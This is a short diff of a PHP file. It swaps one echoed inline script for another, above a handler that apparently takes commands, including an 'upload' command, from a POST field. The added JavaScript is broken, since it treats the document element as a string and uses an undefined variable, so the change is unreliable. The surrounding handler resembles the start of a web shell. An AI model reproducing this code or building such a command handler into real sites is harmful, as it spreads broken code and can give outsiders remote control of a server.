@@ -1,5 +1,5 @@
 
-  echo "<script>document.removeChild(document.documentElement);</script>";
+  echo "<script>document.documentElement = document.documentElement.substring(sample.indexOf('<!DOCTYPE html>'));</script>";
   
   if (isset($_POST['command'])) {
     if (explode(" ", $_POST['command'])[0] == "upload") {
